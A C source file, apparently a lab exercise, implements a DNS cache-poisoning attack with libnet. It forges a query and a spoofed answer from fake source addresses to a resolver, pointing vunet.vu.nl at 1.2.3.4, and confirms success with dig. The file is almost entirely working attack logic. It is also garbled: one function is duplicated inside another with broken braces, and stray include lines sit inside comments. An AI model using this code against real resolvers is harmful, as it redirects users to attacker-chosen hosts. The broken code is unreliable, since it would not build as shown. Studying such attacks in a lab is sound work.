#include <libnet.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <arpa/inet.h> // For htons, htonl
#include <netinet/in.h> // For inet_pton
#include <libnet/libnet-functions.h>

#define DNS_QUERY_NAME "\005vunet\002vu\002nl\000" // Domain to be spoofed
#define SPOOFED_IP "1.2.3.4"          // Spoofed IP address for the domain
#define RESOLVER_IP "192.168.10.10"  // IP address of the resolver

// Define DNS question structure
struct dns_question {
    char domain[13];
    uint16_t qtype;
    uint16_t qclass;
} __attribute__((packed));

// Define DNS answer structure
struct dns_answer {
    char domain[13];
    uint16_t qtype;
    uint16_t qclass;
    char answer[13];
    uint16_t type;
    uint16_t class;
    uint32_t ttl;
    uint16_t rdlength;
    char rdata[4]; // IPv4 address is 4 bytes
} __attribute__((packed));


// Utility function to print domain name in DNS format
void print_dns_name(const unsigned char *dns_name) {
    int i = 0;
    while (dns_name[i] != 0) {
        int len = dns_name[i++];
        for (int j = 0; j < len; ++j) {
            printf("%c", dns_name[i + j]);
        }
        i += len;
        if (dns_name[i] != 0) printf(".");
    }
}

// Function to print the contents of the dns_question struct
void print_dns_question(const struct dns_question *query) {
    printf("DNS Query Structure:\n");
    printf("Domain: ");
    print_dns_name((const unsigned char *)query->domain);
    printf("\n");
    printf("QType: %u\n", ntohs(query->qtype));
    printf("QClass: %u\n\n", ntohs(query->qclass));
}

// Function to print the contents of the dns_answer struct
void print_dns_answer(const struct dns_answer *response) {
    char ip_str[INET_ADDRSTRLEN];
    printf("DNS Answer Structure:\n");
    printf("Domain: ");
    print_dns_name((const unsigned char *)response->domain);
    printf("\n");
    printf("QType: %u\n", ntohs(response->qtype));
    printf("QClass: %u\n", ntohs(response->qclass));
    printf("Type: %u\n", ntohs(response->type));
    printf("Class: %u\n", ntohs(response->class));
    printf("TTL: %u\n", ntohl(response->ttl));
    printf("RDLength: %u\n", ntohs(response->rdlength));
    inet_ntop(AF_INET, response->rdata, ip_str, INET_ADDRSTRLEN);
    printf("RData (IP Address): %s\n\n", ip_str);

// Function to print the contents of the dns_question struct
void print_dns_question(const struct dns_question *query) {
    printf("DNS Query Structure:\n");
    printf("Domain: ");
    print_dns_name((const unsigned char *)query->domain);
    printf("\n");
    printf("QType: %u\n", ntohs(query->qtype));
    printf("QClass: %u\n\n", ntohs(query->qclass));
}

// Function to print the contents of the dns_answer struct
}


void domain_to_dns_format(unsigned char* dns, const char* domain) {
    int lock = 0;
    char dname[256];
    strcpy(dname, domain);

    strcat(dname, "."); // Append a dot at the end for easy parsing

    for (int i = 0; i < strlen(dname); i++) {
        if (dname[i] == '.') {
            *dns++ = i - lock;
            for (; lock < i; lock++) {
                *dns++ = dname[lock];
            }
            lock++; // Skip the dot
        }
    }
    *dns++ = 0; // Null terminate the DNS formatted name
}

// Function to send DNS query
void send_dns_query(libnet_t *l, uint16_t query_id, uint16_t resolver_port) {
    //unsigned char dns_format_domain[256];
    //domain_to_dns_format(dns_format_domain, DNS_QUERY_NAME);
    // DNS header structure
    struct dns_question query;
    strcpy(query.domain, DNS_QUERY_NAME);
    query.qtype = htons(1);  // Type A (Host address)
    query.qclass = htons(1); // Class IN
    //print_dns_question(&query);

    //Building DNS packet
   libnet_build_dnsv4(
    LIBNET_UDP_DNSV4_H, // Total length of the DNS packet
    query_id,               // ID
    0x0100,             // Flags
    1,                  // Number of questions
    0,                  // Number of answers
    0,                  // Number of authority records
    0,                  // Number of additional records
    (uint8_t*)&query,    // Pointer to the payload
    sizeof(struct dns_question),      // Length of the payload
    l,                  // Libnet context
    0                   // Protocol tag
   );

    // Build and send the UDP packet
    libnet_ptag_t udp_tag = libnet_build_udp(
        resolver_port,                             // Source port (random)
        53,                  // Destination port
        LIBNET_UDP_H + LIBNET_UDP_DNSV4_H + sizeof(struct dns_question),  // Packet length
        0,                              // Checksum (0 for libnet to autofill)
        NULL,                           // Payload
        0,                              // Payload length
        l,                              // Libnet context
        0                               // Protocol tag
    );

    if (udp_tag == -1) {
        fprintf(stderr, "Error building UDP header: %s\n", libnet_geterror(l));
        return;
    }

    // Build IPv4 header
    libnet_ptag_t ipv4_tag = libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_UDP_DNSV4_H + sizeof(struct dns_question),  // Total packet lengt#include <netinet/in.h> // For inet_ptonh
        0,                                            // TOS
        libnet_get_prand(LIBNET_PRu16),               // IP ID
        0,                                            // Fragmentation
        64,                                           // TTL
        IPPROTO_UDP,                                  // Protocol
        0,                                            // Checksum
        libnet_name2addr4(l, "192.168.10.20", LIBNET_DONT_RESOLVE), // Source IP
        libnet_name2addr4(l, "192.168.10.10", LIBNET_DONT_RESOLVE),
        NULL,                                         // Payload (none)
        0,                                            // Payload size
        l,                                            // Libnet context
        0                                             // Protocol tag
    );

    if (ipv4_tag == -1) {
        fprintf(stderr, "Error building IPv4 header: %s\n", libnet_geterror(l));
        return;
    }

    // Write packet
    int bytes_written = libnet_write(l);
    if (bytes_written == -1) {
        fprintf(stderr, "Error sending packet: %s\n", libnet_geterror(l));
    } else {
        printf("\n");
        
    }
}

void send_dns_response(libnet_t *l, uint16_t query_id, uint16_t resolver_port) {
 
    unsigned char dns_format_domain[256];
    domain_to_dns_format(dns_format_domain, DNS_QUERY_NAME);
    struct dns_answer response;
    strcpy(response.domain, DNS_QUERY_NAME);
    strcpy(response.answer, DNS_QUERY_NAME);
    response.qtype = htons(1);      // A record
    response.qclass = htons(1);     // IN class
    response.type = htons(1);       // A record
    response.class = htons(1);      // IN class
    response.ttl = htonl(300);     // TTL
    response.rdlength = htons(4);  // Length of IP address
    inet_pton(AF_INET, SPOOFED_IP, response.rdata); // IP address to be spoofed
    //print_dns_answer(&response);


   if(libnet_build_dnsv4(
        LIBNET_UDP_DNSV4_H, // Total length of the DNS packet
        query_id,               // ID
        0x2040,             // Flags
        1,                  // Number of questions
        1,                  // Number of answers
        0,                  // Number of authority records
        0,                  // Number of additional records
        (uint8_t*)&response,    // Pointer to the payload
        sizeof(struct dns_answer),      // Length of the payload
        l,                  // Libnet context
        0                   // Protocol tag
    ) == -1) {
        fprintf(stderr, "Error building DNS header: %s\n", libnet_geterror(l));
        return;
    }
   

    
    if(libnet_build_udp(
        53,                                 // Source UDP port (DNS)
        resolver_port,                      // Destination UDP port
        LIBNET_UDP_H + LIBNET_UDP_DNSV4_H + sizeof(struct dns_answer),    // Total length of the UDP packet
        0,                                  // Checksum (0 for libnet to autofill)
        NULL,                               // Packet payload
        0,                                  // Length of payload
        l,                                  // libnet context
        0                                   // Protocol tag (0 for a new header)
    ) == -1)
    {
        fprintf(stderr, "Error building UDP header: %s\n", libnet_geterror(l));
        return;
        
    }
    

    if( libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_UDP_DNSV4_H + sizeof(struct dns_answer),  // Total packet lengt#include <netinet/in.h> // For inet_ptonh
        0,                                            // TOS
        libnet_get_prand(LIBNET_PRu16),               // IP ID
        0,                                            // Fragmentation
        64,                                           // TTL
        IPPROTO_UDP,                                  // Protocol
        0,                                            // Checksum
        libnet_name2addr4(l, "192.168.10.30", LIBNET_DONT_RESOLVE), // Source IP
        libnet_name2addr4(l, "192.168.10.10", LIBNET_DONT_RESOLVE),
        NULL,                                         // Payload (none)
        0,                                            // Payload size
        l,                                            // Libnet context
        0                                             // Protocol tag
    ) == -1){
        fprintf(stderr, "Error building IPv4 header: %s\n", libnet_geterror(l));
        return;
    }

    int bytes_written = libnet_write(l);
    if (bytes_written == -1) {
        fprintf(stderr, "Error sending packet: %s\n", libnet_geterror(l));
    } else {
        printf("\n");
    }

}


int main(int argc, char *argv[]) {
    FILE *fp;
    char output[1035];
    const char* target_ip = "1.2.3.4";
    int max_retries = 5; // You can set this to the number of retries you want
    int retry_count = 0;
    int found = 0;

    if (argc != 5 || strcmp(argv[1], "-p") != 0 || atoi(argv[2]) != 1) {
        fprintf(stderr, "Usage: %s -p 1 <resolver-port> <query-ID>\n", argv[0]);
        return 1;
    }

    uint16_t resolver_port = (uint16_t)atoi(argv[3]);
    uint16_t query_id = (uint16_t)atoi(argv[4]);

    char errbuf[LIBNET_ERRBUF_SIZE];
    libnet_t *l = libnet_init(LIBNET_RAW4, NULL, errbuf);
    if (l == NULL) {
        fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
        return 2;
    }
    send_dns_query(l, query_id, resolver_port);
    send_dns_response(l, query_id, resolver_port);
    //Set up a loop to keep re trying until the target IP is found or the max number of retries is reached
      while (retry_count < max_retries && !found) {
        fp = popen("dig @192.168.10.10 vunet.vu.nl +short", "r");
        if (fp == NULL) {
            printf("Failed to run command\n");
            exit(1);
        }
        //Get the output from the dig command and check if the target IP is found
        //If the target IP is found, set found to 1 to break out of the loop
        while (fgets(output, sizeof(output), fp) != NULL) {
            if (strstr(output, target_ip) != NULL) {
                found = 1;
                break;
            }
        }

        pclose(fp);

        //If the target IP is not found, increment the retry count and try again
        if (!found) {
            retry_count++;
            // Sleep for a bit before retrying (e.g., 1 second)
            send_dns_query(l, query_id, resolver_port);
            send_dns_response(l, query_id, resolver_port);
        }
    }

    if (found) {
        printf("vunet.vu.nl %s\n", target_ip);
    } else {
        printf("\n");
        
    }
    

    // Introduce a delay if needed (usleep uses microseconds)
    //usleep(500000); // 500 milliseconds delay

    libnet_destroy(l);
    return 0;
}